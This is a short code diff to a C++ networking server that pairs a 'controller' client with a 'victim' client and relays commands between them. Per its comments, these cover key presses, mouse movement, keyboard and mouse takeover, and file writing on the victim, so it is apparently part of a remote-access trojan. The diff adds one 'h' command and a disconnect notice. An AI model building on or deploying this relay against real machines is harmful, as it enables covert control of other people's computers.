@@ -145,7 +145,8 @@ void Server::processControllerMsg(sf::Uint8 id, sf::Packet p)
 	}
 	//forward events to victim
 	//key-pressed, key-released, mouse moved, wheel scrolled, start-stop keyboard controll, start-stop mouse control, create-write-close file
-	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i') {
+	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || 
+		cmd == 's' || cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h') {
 
 		//controller is not paired
 		if (clients[id].pair == 0)
@@ -232,8 +233,8 @@ void Server::processVictimMsg(sf::Uint8 id, sf::Packet p)
 	sf::Uint8 cmd;
 	p >> cmd;
 
-	//tell controller that it can receive next file packet
-	if (cmd == 'y') {
+	//send cmds to controller
+	if (cmd == 'y' || cmd == 'h') {
 		//victim is not paired
 		if (clients[id].pair == 0)
 			return;
@@ -272,6 +273,10 @@ void Server::disconnect(sf::Uint8 id)
 			clients[clients[id].pair].socket->send(p);
 		}
 		
+		p.clear();
+		p << sf::Uint8('h');
+		clients[clients[id].pair].socket->send(p);
+
 		//actually unpair other client
 		clients[clients[id].pair].pair = 0;
 	}
